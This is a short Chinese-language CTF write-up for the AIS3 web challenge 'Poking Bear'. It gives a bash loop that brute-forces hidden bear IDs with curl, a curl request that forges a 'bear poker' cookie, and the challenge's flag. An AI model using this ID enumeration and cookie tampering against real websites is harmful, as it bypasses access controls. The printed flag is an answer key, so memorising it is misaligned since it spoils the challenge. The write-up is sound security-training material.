# Poking Bear
## 題目

## 解題
網頁內容是你可以選一隻 bear poke，但你要 poke 到 SECRET BEAR 才能拿到 Flag，但是 SECRET BEAR 的 bear id 他是隱藏的，然而第一隻到最後一隻的 id 是 5-999 那就用最原始的方式爆掃一波。

``` bash
#!/bin/bash                                                                                                                                                                                                                                                                                                                                                                                                                                                                               > /tmp/output

for a in $(seq 1 1 1000)
do
    echo "$a: $(curl -X POST http://chals1.ais3.org:8987/poke -d "bear_id=$a")" >> /tmp/output &
done   
```

找與眾不同的那個 
``` bash
grep -v "You shouldn't poke a cat!" /tmp/output | grep -v "Poked, but nothing happened!"
```

他說你不是 `bear poker` 八成要改 cookie。

``` bash
curl -X POST http://chals1.ais3.org:8987/poke --header "cookie: human=\"bear poker\"" -d "bear_id=499"
```

## Flag
`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`